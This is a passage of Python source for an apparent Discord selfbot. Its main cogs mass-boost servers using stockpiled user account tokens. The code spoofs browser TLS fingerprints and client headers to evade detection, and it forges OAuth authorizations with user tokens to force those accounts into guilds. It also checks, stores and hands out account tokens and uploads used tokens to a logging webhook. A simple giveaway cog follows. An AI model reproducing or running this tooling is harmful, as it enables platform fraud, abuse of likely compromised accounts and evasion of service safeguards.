                print(f"Rate-limited on webhook spam, waiting...")
                await asyncio.sleep(5)

class Boost(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_cookies(self) -> dict:
        try:
            response = requests.get("https://discord.com").cookies
            cookies = {
                "__dcfduid": response.get("__dcfduid"),
                "__sdcfduid": response.get("__sdcfduid"),
                "_cfuvid": response.get("_cfuvid"),
                "__cfruid": response.get("__cfruid"),
            }
            return cookies
        except Exception:
            return {}

    def ran_str(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def censor_token(self, token):
        return token[:10] + "..." + token[-5:]

    async def check_token(self, token):
        try:
            token = token.strip().strip('"').strip("'")
            if ":" in token:
                parts = token.split(":")
                token = parts[2].strip() if len(parts) >= 3 and "@" in parts[0] else parts[-1].strip()
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }
            data = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)

            if data.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            return False 
    async def join_with_token(self, token, invite):
        try:
            chrome = "126"
            fingerprint_dict = random.choice(fps)
            ja3 = fingerprint_dict["ja3"]
            user_agent = fingerprint_dict["user-agent"]
            x_super_properties = fingerprint_dict["x-super-properties"]

            session = tls_client.Session(
                client_identifier="chrome_" + chrome,
                random_tls_extension_order=True,
                ja3_string=ja3,
            )
            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": token,
                "content-type": "application/json",
                "origin": "https://discord.com",
                "referer": "https://discord.com",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-super-properties": x_super_properties,
            }
            join_data = {"session_id": self.ran_str()}
            response = session.post(
                f"https://discord.com/api/v9/invites/{invite}",
                headers=headers,
                json=join_data,
                cookies=self.get_cookies(),
            )
            if response.status_code == 200:
                return True, f"Joined using {self.censor_token(token)}"
            else:
                return False, f"Failed to join {self.censor_token(token)}"
        except Exception:
            return False, "An error occurred during joining."

    async def boost_with_token(self, token, guild_id):
        session = tls_client.Session(client_identifier="chrome_126", random_tls_extension_order=True)
        headers = {"authorization": token, "content-type": "application/json"}
        response = session.get(
            "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
            headers=headers, 
            cookies=self.get_cookies()
        )
        if response.status_code != 200:
            return False, f"Failed to fetch boosts {self.censor_token(token)} - {response.text}"
        boost_data = response.json()
        if not boost_data:
            return False, f"No boosts available {self.censor_token(token)}"
        applied_boosts = 0
        for boost in boost_data:
            if applied_boosts >= 2:
                break
            boost_id = boost["id"]
            payload = {"user_premium_guild_subscription_slot_ids": [boost_id]}
            boosted = session.put(
                f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
                json=payload,
                headers=headers
            )
            if boosted.status_code == 201:
                applied_boosts += 1
            else:
                return False, f"Failed to put boost {self.censor_token(token)} - {boosted.text}"
        if applied_boosts == 2:
            return True, f"Successfully boosted 2 times using {self.censor_token(token)}"
        else:
            return False, f"Only boosted {applied_boosts} times using {self.censor_token(token)}"


    @commands.command()
    async def boost(self, ctx, guild_invite: str, token_type: int, num_token: int):
        invite = guild_invite
        count = num_token
        type = token_type
        await ctx.message.delete()

        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for `1m_tokens.txt` or `3` for `3m_tokens.txt`.")       
        token_file = f"boost_tokens_data/{type}m_tokens.txt"

        try:
            async with aiofiles.open(token_file, mode="r") as f:
                lines = await f.readlines()
        except FileNotFoundError:
            return await senderror(ctx, "Error", f"Token file `{token_file}` not found.")

        all_tokens = [t.strip().split(":")[-1] for t in lines if t.strip()]
        tokens = all_tokens[:count]
        if not tokens:
            return await senderror(ctx, "Error", "No tokens available.")

        invite_code = invite.split("/")[-1]
        response = tls_client.Session().get(f"https://discord.com/api/v9/invites/{invite_code}")
        if response.status_code != 200:
            return await senderror(ctx, "Error", "Invalid invite link.")

        guild_id = response.json().get("guild", {}).get("id")
        if not guild_id:
            return await senderror(ctx, "Error", "Failed to retrieve guild ID from the invite.")
        
        if len(tokens) < count:
            return await send(ctx, "⚠️ Insufficient Tokens", f"Requested: {count}, Available: {len(tokens)}")

        prog_msg = await send(ctx, "🎁 Boosting Server", f"Starting to apply **{2 * count} boost(s)** to server ID: `{guild_id}`...\nThis might take a while ⏳") 
        joined_count = 0
        boosted_count = 0
        used_tokens = []
        messages = []

        for token in tokens:
            joined, join_msg = await self.join_with_token(token, invite_code)
            if joined:
                joined_count += 1
            boosted, boost_msg = await self.boost_with_token(token, guild_id)
            if boosted:
                boosted_count += 1

            used_tokens.append(token)
            messages.append(f"{join_msg}\n{boost_msg}")

            await asyncio.sleep(random.uniform(1, 3))

        used_tokens_file = "used_boost_tokens.txt"
        async with aiofiles.open(used_tokens_file, "w") as f:
            await f.write("\n".join(used_tokens))

        remaining_tokens = [t for t in all_tokens if t not in used_tokens]
        async with aiofiles.open(token_file, "w") as f:
            await f.write("\n".join(remaining_tokens))

        with open("config.json") as f:
            config = json.load(f)
        webhook_url = config.get("boosting_logs_webhook_url")

        if webhook_url:
            embed = discord.Embed(
                title="📈 Boosting Log",
                description=f"",
                color=0x00ffcc
            )
            embed.add_field(name="Invite Code", value=f"`{invite_code}`", inline=False)
            embed.add_field(name="Tokens Type", value=f"`{token_type}` month", inline=True)
            embed.add_field(name="Tokens Used", value=f"`{len(used_tokens)}`", inline=True)
            embed.add_field(name="Joined", value=f"`{joined_count}`", inline=True)
            embed.add_field(name="Boosted", value=f"`{boosted_count}`", inline=True)
            embed.set_footer(text=f"Powered by {selfbot_name} ")

            async with aiohttp.ClientSession() as session:
                with open(used_tokens_file, "rb") as file_data:
                    form = aiohttp.FormData()
                    form.add_field("file", file_data, filename=used_tokens_file)
                    form.add_field("payload_json", json.dumps({
                        "embeds": [embed.to_dict()]
                    }))
                    await session.post(webhook_url, data=form)        
                    msg = (
                        f"Invite code : `{invite_code}`\n"
                        f"Tokens type : `{token_type}` month\n"
                        f"Tokens used : `{len(used_tokens)}`\n"
                        f"Joined : `{joined_count}`\n"
                        f"Boosted : `{boosted_count}`"
                    )
                    await prog_msg.delete()
                    await send(ctx, "Boosting Complete", msg)
    
    @commands.command()
    async def btool(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"           
            f"<a:boost_2:1554763187210031155> | **Oauth boosting** **:** **`{prefix}aboost [invite] [count] [type] <nick>`**\n"             
            f"<a:boost_2:1554763187210031155> | **Boost a srv** **:** **`{prefix}boost [invite] [count] [type]`**\n"
            f"<a:boost_2:1554763187210031155> | **Bot Invite Link** **:** **`{prefix}invite`**\n"
            f"<a:boost_2:1554763187210031155> | **Show Stock** **:** **`{prefix}checkstock`**\n"
            f"<a:boost_2:1554763187210031155> | **Check Tokens** **:** **`{prefix}checktokens [type]`**\n"
            f"<a:boost_2:1554763187210031155> | **Add Tokens** **:** **`{prefix}addtokens [type] [tokens]`**\n"
            f"<a:boost_2:1554763187210031155> | **Clean Duplicates** **:** **`{prefix}cleandup [type]`**\n"
            f"<a:boost_2:1554763187210031155> | **Clean invalids** **:** **`{prefix}cleaninvalid`**\n"
            f"<a:boost_2:1554763187210031155> | **Clean used** **:** **`{prefix}cleanused [type]`**\n"
            f"<a:boost_2:1554763187210031155> | **Give tokens from stock** **:** **`{prefix}give [type] [count]`**\n"
            f"<a:boost_2:1554763187210031155> | **Clear tokens** **:** **`{prefix}cleantokens [type]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Boost Tool Commands__<a:crown:1554756538445336626>", description)


    @commands.command(aliases=['checkstock','showstock'])
    async def stock(self, ctx):
        await ctx.message.delete()
        stock_data = {}
        for type in [1, 3]:
            file_path = f"boost_tokens_data/{type}m_tokens.txt"
            used_file_path = f"boost_tokens_data/{type}m_used.txt"
            
            try:
                async with aiofiles.open(file_path, mode="r") as f:
                    tokens = await f.readlines()
                stock_data[f"{type}m"] = len([t.strip() for t in tokens if t.strip()])
            except FileNotFoundError:
                stock_data[f"{type}m"] = 0
            
            try:
                async with aiofiles.open(used_file_path, mode="r") as f:
                    used_tokens = await f.readlines()
                stock_data[f"{type}m_used"] = len([t.strip() for t in used_tokens if t.strip()])
            except FileNotFoundError:
                stock_data[f"{type}m_used"] = 0
        
        invalid_file_path = "boost_tokens_data/invalid_tokens.txt"
        try:
            async with aiofiles.open(invalid_file_path, mode="r") as f:
                invalid_tokens = await f.readlines()
            stock_data["invalids"] = len([t.strip() for t in invalid_tokens if t.strip()])
        except FileNotFoundError:
            stock_data["invalids"] = 0
        
        result_message = (
            f"**Stock Availability**\n\n"
            f"**<:arrow:1554766539042062446>1 Month Tokens:** `{stock_data['1m']} tokens`\n"
            f"**<:arrow:1554766539042062446>3 Month Tokens:** `{stock_data['3m']} tokens`\n"
            f"**<:arrow:1554766539042062446>1 Month Used Tokens:** `{stock_data['1m_used']} tokens`\n"
            f"**<:arrow:1554766539042062446>3 Month Used Tokens:** `{stock_data['3m_used']} tokens`\n"
            f"**<:arrow:1554766539042062446>Invalid Tokens:** `{stock_data['invalids']} tokens`"
        )
        await send(ctx, "Tokens Stock Check", result_message)


    @commands.command()
    async def checktokens(self, ctx, type: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for 1-month tokens or `3` for 3-month tokens.","30")
        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = await f.readlines()
            tokens = [t.strip() for t in tokens if t.strip()]
            if not tokens:
                return await senderror(ctx, "Check Tokens", f"No tokens available for {type}-month boosts.","30")
            msg=await send(ctx,"Boost Tokens Checker",f"**Count:** **`{len(tokens)}`**\n**Type:** **`{type} month`**\n**Status:** **`Checking...`**")
            valid_tokens = []
            invalid_tokens = []
            display_messages = []
            for token in tokens:
                original_format = token 
                token = token.split(":")[-1] 
                is_valid = await self.check_token(token)
                censored_token = self.censor_token(original_format) 

                if is_valid:
                    valid_tokens.append(original_format)
                    display_messages.append(f":white_check_mark: `{censored_token}`")
                else:
                    invalid_tokens.append(original_format)
                    display_messages.append(f":x: `{censored_token}`")
                await asyncio.sleep(1)
            async with aiofiles.open(file_path, mode="w") as file:
                await file.write("\n".join(valid_tokens) + "\n")
            async with aiofiles.open("boost_tokens_data/invalid_tokens.txt", mode="w") as file:
                await file.write("\n".join(invalid_tokens) + "\n")
            chunks = [display_messages[i:i+20] for i in range(0, len(display_messages), 20)]
            for chunk in chunks:
                try:
                    await msg.delete()
                except:
                    pass
                await send(ctx, f"Boost Token Check\n**Type:** `{type} month`\n**Valid:** `{len(valid_tokens)}` \n**Invalid:** `{len(invalid_tokens)}`", f"\n".join(chunk))
        except FileNotFoundError:
            await send(ctx, "Error", f"The file for {type}-month tokens does not exist.","30")

    @commands.command()
    async def addtokens(self, ctx, type: int, *tokens):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for 1-month tokens or `3` for 3-month tokens.")

        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            async with aiofiles.open(file_path, mode="r") as f:
                existing_tokens = {line.strip() for line in await f.readlines()}
        except FileNotFoundError:
            existing_tokens = set()
        new_tokens = set(t.strip() for t in tokens if t.strip()) - existing_tokens
        if not new_tokens:
            return await senderror(ctx, "Add Tokens", "No new tokens were added (duplicates detected).")
        async with aiofiles.open(file_path, mode="a") as f:
            await f.writelines(f"{token}\n" for token in new_tokens)
        await send(ctx, "Add Tokens", f":white_check_mark: Successfully added `{len(new_tokens)}` tokens to `{type}m_tokens.txt`.")

    @commands.command()
    async def cleandup(self, ctx, type: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for 1-month tokens or `3` for 3-month tokens.")

        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = [line.strip() for line in await f.readlines() if line.strip()]
            if not tokens:
                return await senderror(ctx, "Clean Duplicates", "No tokens found in the file.")
            unique_tokens = list(set(tokens)) 
            removed_count = len(tokens) - len(unique_tokens)
            async with aiofiles.open(file_path, mode="w") as f:
                await f.writelines(f"{token}\n" for token in unique_tokens)
            await send(ctx, "Clean Duplicates", f":white_check_mark: Removed `{removed_count}` duplicate tokens. `{len(unique_tokens)}` unique tokens remain.")
        except FileNotFoundError:
            await send(ctx, "Error", f"The file for {type}-month tokens does not exist.")


    @commands.command()
    async def give(self, ctx, type: int, count: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await ctx.send(":x: **Invalid type!** Use `1` for 1-month tokens or `3` for 3-month tokens.", delete_after=5)

        file_path = f"boost_tokens_data/{type}m_tokens.txt"

        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = await f.readlines()

            tokens = [t.strip() for t in tokens if t.strip()]
            if len(tokens) < count:
                return await ctx.send(f":x: **Not enough tokens available.** Only `{len(tokens)}` left.", delete_after=5)

            confirmation_msg = await ctx.send(f"**Are you sure you want to send `{count}` tokens from `{type}-month` stock here?**\n-# Reply with `yes` within **30 seconds** to confirm.")

            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "yes"

            try:
                reply = await self.bot.wait_for("message", check=check, timeout=30)
                await confirmation_msg.delete()
                await reply.delete()
            except asyncio.TimeoutError:
                await confirmation_msg.delete()
                return await ctx.send(":x: **Token send operation timed out.**", delete_after=5)

            tokens_to_send = tokens[:count]
            remaining_tokens = tokens[count:]

            async with aiofiles.open(file_path, mode="w") as f:
                await f.write("\n".join(remaining_tokens) + "\n")

            token_text = "\n".join(tokens_to_send)

            if len(token_text) <= 1900:
                await ctx.send(token_text)
            else:
                temp_path = f"boost_tokens_data/tokens.txt"
                async with aiofiles.open(temp_path, "w") as f:
                    await f.write(token_text)

                await ctx.send(
                    content=":warning: **Writing limit reached, sending as a `.txt` file instead.**",
                    file=discord.File(temp_path)
                )
                try:
                    os.remove(temp_path)
                except Exception as e:
                    print(f"Failed to delete temp file: {e}")

        except FileNotFoundError:
            await ctx.send(f":x: **The file for {type}-month tokens does not exist.**", delete_after=5)

    @commands.command(aliases=['cleanused'])
    async def clearused(self, ctx):
        await ctx.message.delete()
        for type in [1, 3]:
            file_path = f"boost_tokens_data/{type}m_used.txt"
            try:
                if os.path.exists(file_path):
                    open(file_path, "w").close()
                    await send(ctx, "Clear Tokens", "Successfully cleared all used tokens")                    
                else:
                    await ctx.send(f"File `{file_path}` not found.")
            except Exception as e:
                await ctx.send(f"Error clearing tokens in `{file_path}`: {e}")

    @commands.command(aliases=['cleaninvalid'])
    async def clearinvalid(self, ctx):
        await ctx.message.delete()
        file_path = f"boost_tokens_data/invalid_tokens.txt"
        try:
            if os.path.exists(file_path):
                open(file_path, "w").close()
                await send(ctx, "Clear Tokens", "Successfully cleared all invalid tokens")                
            else:
                await ctx.send(f"File `{file_path}` not found.")
        except Exception as e:
            await ctx.send(f"Error clearing tokens in `{file_path}`: {e}")



    @commands.command(aliases=['cleantokens'])
    async def cleartokens(self, ctx, type: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await ctx.send(":x: **Invalid type!** Use `1` for 1-month tokens or `3` for 3-month tokens.", delete_after=5)

        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            if os.path.exists(file_path):
                open(file_path, "w").close() 
                await send(ctx,"Clear Tokens",f"Successfully cleared all `{file_path} month` stock tokens.")
            else:
                await ctx.send(f"File `{file_path}` not found.")
        except Exception as e:
            await ctx.send(f"Error clearing tokens: {e}")

try:
    with open('bot_config.json', 'r') as config_file:
        boost_config = json.load(config_file)
except Exception:
    boost_config = {}

executor = ThreadPoolExecutor(max_workers=10)
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
BUILD_NUMBER = 165486
CV = "108.0.0.0"
BOT_TOKEN = boost_config.get('BOT_TOKEN', '')
CLIENT_SECRET = boost_config.get('CLIENT_SECRET', '')
CLIENT_ID = boost_config.get('CLIENT_ID', '')
REDIRECT_URI = boost_config.get('REDIRECT_URI', 'http://localhost:8080')
API_ENDPOINT = 'https://canary.discord.com/api/v9'
AUTH_URL = f"https://canary.discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join"
BOT_INVITE = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&permissions=67108865&integration_type=0&scope=bot"

SUPER_PROPERTIES = b64encode(json.dumps({
    "os": "Windows",
    "browser": "Chrome",
    "device": "PC",
    "system_locale": "en-GB",
    "browser_user_agent": USER_AGENT,
    "browser_version": CV,
    "os_version": "10",
    "referrer": "https://discord.com/channels/@me",
    "referring_domain": "discord.com",
    "referrer_current": "",
    "referring_domain_current": "",
    "release_channel": "stable",
    "client_build_number": BUILD_NUMBER,
    "client_event_source": None
}, separators=(',', ':')).encode()).decode()


class Joiner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def exchange_code(self, code):
        try:
            data = {
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': REDIRECT_URI
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
            return r.json() if r.ok else False
        except Exception as e:
            print(f"[exchange_code] Error: {e}")
            return False

    def get_user(self, access: str):
        try:
            r = requests.get("https://canary.discord.com/api/v9/users/@me", headers={"Authorization": f"Bearer {access}"})
            data = r.json()
            if isinstance(data, dict) and 'id' in data:
                return data['id']
        except Exception as e:
            print(f"[get_user] Error: {e}")
        return None

    def get_headers(self, token):
        return {
            "Authorization": token,
            "Origin": "https://canary.discord.com",
            "Accept": "*/*",
            "X-Discord-Locale": "en-GB",
            "X-Super-Properties": SUPER_PROPERTIES,
            "User-Agent": USER_AGENT,
            "Referer": "https://canary.discord.com/channels/@me",
            "X-Debug-Options": "bugReporterEnabled",
            "Content-Type": "application/json"
        }

    def rename(self, token, guild, nickname):
        try:
            client = tls_client.Session(client_identifier="firefox_102")
            client.headers.update(self.get_headers(token))
            r = client.patch(
                f"https://canary.discord.com/api/v9/guilds/{guild}/members/@me",
                json={"nick": nickname})
            if r.status_code in (200, 201, 204):    
                return "ok" 
        except Exception as e:
            print(f"[rename] Error: {e}")
            return "error"

    def authorizer(self, token, guild, nickname):
        try:
            headers = self.get_headers(token)
            r = requests.post(AUTH_URL, headers=headers, json={"authorize": "true"})
            if not r.ok:
                return "fail"

            location = r.json().get("location", "")
            code = location.replace(f"{REDIRECT_URI}?code=", "")
            exchange = self.exchange_code(code)
            if not exchange:
                return "fail"

            access_token = exchange.get("access_token")
            userid = self.get_user(access_token)
            if not userid:
                return "fail"

            self.add_to_guild(access_token, userid, guild)
            if nickname:
                threading.Thread(target=self.rename, args=(token, guild, nickname)).start()

            return "ok"
        except Exception as e:
            print(f"[authorizer] Error: {e}")
            return "fail"

    def add_to_guild(self, access_token, userID, guild):
        try:
            url = f"{API_ENDPOINT}/guilds/{guild}/members/{userID}"
            headers = {
                "Authorization": f"Bot {BOT_TOKEN}",
                "Content-Type": "application/json"
            }
            r = requests.put(url=url, headers=headers, json={"access_token": access_token})
            return r.status_code
        except Exception as e:
            return 0

    def put_boost(self, token, guild, nickname=None):
        try:
            headers = self.get_headers(token)
            client = tls_client.Session(client_identifier="firefox_102")
            client.headers.update(headers)
            r = client.get(f"{API_ENDPOINT}/users/@me/guilds/premium/subscription-slots")
            data = r.json()
            if not isinstance(data, list):
                return 0

            applied_boosts = 0
            for item in data:
                try:
                    slot_id = item['id']
                    payload = {"user_premium_guild_subscription_slot_ids": [slot_id]}
                    boost_r = client.put(
                        f"{API_ENDPOINT}/guilds/{guild}/premium/subscriptions",
                        json=payload)

                    if boost_r.status_code in (200, 201, 204):
                        applied_boosts += 1
                        if nickname:
                            self.rename(token, guild, nickname)
                except Exception as e:
                    print(f"[put_boost] Error while applying boost: {e}")
                    continue

            return applied_boosts
        except Exception as e:
            print(f"[put_boost] Error: {e}")
            return 0

    def main(self, token, guild, nickname=None):
        try:
            joined = 0
            boosted = 0

            result = self.authorizer(token, guild, nickname)
            if result == "ok":
                joined = 1
                boosted = self.put_boost(token, guild, nickname)

            return f"joined:{joined} boosted:{boosted}"
        except Exception as e:
            print(f"[main] Token skipped due to error: {e}")
            return "joined:0 boosted:0"
        
    @commands.command(name="aboost")
    async def aboost(self, ctx, guild_id: int, token_type: int, num_tokens: int, nickname: str = None):
        await ctx.message.delete()
        if not guild_id or num_tokens <= 0:
            return await send(ctx, "❌ Invalid Arguments", "Please provide a valid server ID and number of boosts.")

        if token_type not in [1, 3]:
            return await send(ctx, "❌ Invalid Token Type", "Please specify `1` for 1-month or `3` for 3-month tokens.")

        file_name = f"boost_tokens_data/{token_type}m_tokens.txt"
        try:
            with open(file_name, "r") as f:
                tokens = f.readlines()
        except FileNotFoundError:
            return await send(ctx, "❌ File Not Found", f"The file `{file_name}` does not exist.")

        if len(tokens) < num_tokens:
            return await send(ctx, "⚠️ Insufficient Tokens", f"Requested: {num_tokens}, Available: {len(tokens)}")

        prog_msg = await send(ctx, "🎁 Boosting Server", f"Starting to apply **{2 * num_tokens} boost(s)** to server ID: `{guild_id}`...\nThis might take a while ⏳")

        successful_boosts = 0
        used_tokens = []
        joined_count = 0
        

        for i in range(num_tokens):
            token = tokens[i].strip()
            try:
                if ":" in token:
                    token = token.split(":")[2]
            except Exception as e:
                continue

            result = await ctx.bot.loop.run_in_executor(executor, self.main, token, guild_id, nickname)
            joined, boosted = 0, 0

            if "joined" in result and "boosted" in result:
                parts = result.split()
                joined = int(parts[0].split(":")[1])
                boosted = int(parts[1].split(":")[1])
            
            if joined:
                used_tokens.append(token)
                joined_count += joined

            if boosted:
                successful_boosts += 2
                used_tokens.append(token)
            else:
                used_tokens.append(token)    

        with open(file_name, "w") as f:
            f.writelines(tokens[num_tokens:])

        msg = (
            f"Guild ID : `{guild_id}`\n"
            f"Tokens Type : `{token_type}` month\n"
            f"Tokens used : `{len(used_tokens)}` Tokens\n"
            f"Joined : `{joined_count}` Tokens\n"
            f"Boosted : `{successful_boosts}` Times"
        )
        used_tokens_file = "used_boost_tokens.txt"
        async with aiofiles.open(used_tokens_file, "w") as f:
            await f.write("\n".join(used_tokens))
        permanent_used_file = f"boost_tokens_data\\{token_type}m_used.txt"
        async with aiofiles.open(permanent_used_file, "a") as f:
            await f.write("\n".join(used_tokens) + "\n")            
        webhook_url = config.get("oauth_boosting_logs_webhook_url")    
        if webhook_url:
            embed = discord.Embed(
                title="📈 Outh Boosting Log",
                description=f"",
                color=0x00ffcc
            )
            embed.add_field(name="Guild ID", value=f"`{guild_id}`", inline=False)
            embed.add_field(name="Tokens Type", value=f"`{token_type}` month", inline=True)
            embed.add_field(name="Tokens Used", value=f"`{len(used_tokens)}` Tokens", inline=True)
            embed.add_field(name="Joined", value=f"`{joined_count}` Tokens", inline=True)
            embed.add_field(name="Boosted", value=f"`{successful_boosts}` Times", inline=True)
            embed.set_footer(text=f"Powered by {selfbot_name} ")

            async with aiohttp.ClientSession() as session:
                with open(used_tokens_file, "rb") as file_data:
                    form = aiohttp.FormData()
                    form.add_field("file", file_data, filename=used_tokens_file)
                    form.add_field("payload_json", json.dumps({
                        "embeds": [embed.to_dict()]
                    }))
                    await session.post(webhook_url, data=form)   
        if os.path.exists(used_tokens_file):
            os.remove(used_tokens_file)
        await prog_msg.delete()    
        await send(ctx, "Boosting Complete", msg)

    @commands.command()
    async def invite(self, ctx):
        await ctx.message.delete()
        await send(ctx, "Bot Invite Link", BOT_INVITE)



class Giveaway(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.active_giveaways = {}

    def parse_time(self, duration_str):
        match = re.match(r"^(\d+)([smhd])$", duration_str)
        if not match:
            return None 
        value, unit = int(match.group(1)), match.group(2)
        multiplier = {"s": 1, "m": 60, "h": 3600, "d": 86400}
        return value * multiplier[unit]

    @commands.command()
    async def gstart(self, ctx, duration: str, winners: int, *, prize: str):
        await ctx.message.delete()
        timestamp = time()
        duration_sec = self.parse_time(duration)
        if duration_sec is None:
            return await senderror(ctx, "Invalid Time Format", "Use `s` (seconds), `m` (minutes), `h` (hours), or `d` (days). Example: `10m`, `2h`, `1d`")
        if winners < 1:
            return await senderror(ctx, "Invalid Winners Count", "Number of winners must be at least 1.")
        
        end_time = int(t.time()) + duration_sec
        msg = await send(ctx, ":tada: Giveaway :tada:",
                         f"- **Prize:** {prize}\n"
                         f"- **Winners:** {winners}\n"
                         f"- **Ends:** <t:{end_time}:R>",
                         f"Hosted by {ctx.author} | {timestamp}")
        await msg.add_reaction("\U0001F389")
        
        self.active_giveaways[msg.id] = {
            "channel_id": ctx.channel.id,
            "prize": prize,
            "winners": winners,
            "status": True  
        }

        await asyncio.sleep(duration_sec)

        giveaway = self.active_giveaways.get(msg.id)
        if giveaway and giveaway["status"]:
            try:
                new_msg = await ctx.channel.fetch_message(msg.id)
            except discord.NotFound:
                return 
            
            reaction = next((r for r in new_msg.reactions if str(r.emoji) == "\U0001F389"), None)
            if not reaction:
                return await senderror(ctx, "Giveaway Canceled!", ":x: No participants found.")

            users = [user async for user in reaction.users() if not user.bot]
            if len(users) < winners:
                return await senderror(ctx, "Giveaway Canceled!", ":x: Not enough participants to draw winners!")

            winners_list = random.sample(users, winners)
            winners_mention = ", ".join(winner.mention for winner in winners_list)
            winner_text = "The winner is" if winners == 1 else "The winners are"
            await msg.reply(f":tada: {winner_text} {winners_mention}! :tada: You won **{prize}**")

            giveaway["status"] = False

    @commands.command()
    async def gend(self, ctx, message_id: int = None):
        await ctx.message.delete()
        giveaway = self.active_giveaways.get(message_id)
        if not giveaway:
            return await senderror(ctx, "Error", ":x: No active giveaway found with this message ID.")
        
        channel = self.bot.get_channel(giveaway["channel_id"])
        try:
            new_msg = await channel.fetch_message(message_id)
        except discord.NotFound:
            return await senderror(ctx, "Error", ":x: Giveaway message not found.")

        reaction = next((r for r in new_msg.reactions if str(r.emoji) == "\U0001F389"), None)
        if not reaction:
            return await senderror(ctx, "Giveaway Canceled", ":x: No participants found.")

        users = [user async for user in reaction.users() if not user.bot]
        if len(users) < giveaway["winners"]:
            return await senderror(ctx, "Giveaway Canceled", ":x: Not enough participants to draw winners.")

        if giveaway["status"]:
            winners_list = random.sample(users, giveaway["winners"])
            winners_mention = ", ".join(winner.mention for winner in winners_list)
            winner_text = "The winner is" if giveaway["winners"] == 1 else "The winners are"
            await ctx.send(f"{winner_text} {winners_mention}! :tada: You won {giveaway['prize']}")

            giveaway["status"] = False
        else:
            await send(ctx, "Giveaway ended", ":x: This giveaway has already been ended already.")

    @commands.command()
    async def greroll(self, ctx, message_id: int, winners: int):
        await ctx.message.delete()
        giveaway = self.active_giveaways.get(message_id)
        if not giveaway:
            return await senderror(ctx, "Error", ":x: No active giveaway found with this message ID.")

        channel = self.bot.get_channel(giveaway["channel_id"])
        try:
            new_msg = await channel.fetch_message(message_id)
        except discord.NotFound:
            return await senderror(ctx, "Error", ":x: Giveaway message not found.")

        if not giveaway["status"]:
            reaction = next((r for r in new_msg.reactions if str(r.emoji) == "\U0001F389"), None)
            if not reaction:
                return await senderror(ctx, "Error", ":x: No participants found for reroll.")

            users = [user async for user in reaction.users() if not user.bot]
            if len(users) < winners:
                return await senderror(ctx, "Error", ":x: Not enough participants to draw new winners.")

            winners_list = random.sample(users, winners)
            winners_mention = ", ".join(winner.mention for winner in winners_list)
            winner_text = "The new winner is" if winners == 1 else "The new winners are"
            await ctx.send(f"{winner_text} {winners_mention}! :tada: You won {giveaway['prize']}")

        else:
            await send(ctx, "Giveaway running", f":x:  The giveaway with message ID {message_id} is still running.")

    @commands.command()
    async def gwlist(self, ctx):
        await ctx.message.delete()
        if not self.active_giveaways:
            return await senderror(ctx, "No active giveaways!", ":x: Start one using `gstart`.")
        
        links = []
        for msg_id, data in self.active_giveaways.items():
            channel = self.bot.get_channel(data["channel_id"])
            if channel:
                try:
                    msg = await channel.fetch_message(msg_id)
                    links.append(f"**[{len(links) + 1}]** : [Jump to Giveaway]({msg.jump_url})")
                except discord.NotFound:
                    continue
        
        if not links:
